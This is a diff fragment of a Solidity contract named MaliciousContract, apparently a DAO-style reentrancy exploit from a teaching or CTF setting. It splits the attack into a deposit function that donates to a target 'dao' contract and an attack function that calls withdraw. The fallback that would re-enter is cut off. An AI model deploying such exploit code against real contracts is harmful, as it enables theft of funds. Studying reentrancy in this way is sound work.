@@ -13,9 +13,13 @@ contract MaliciousContract {
         owner = msg.sender;
     }
 
-    function attack() public payable {
-        dao.donate.value(msg.value)(address(this));
-        dao.withdraw(msg.value);
+    function attack(uint attack) public payable {
+        require(attack > 0);
+        dao.withdraw(attack);
+    }
+    function deposit()  public payable{
+        require(msg.value >= 1);
+        dao.donate.value(msg.value)(this);        
     }
 
     function () public payable {
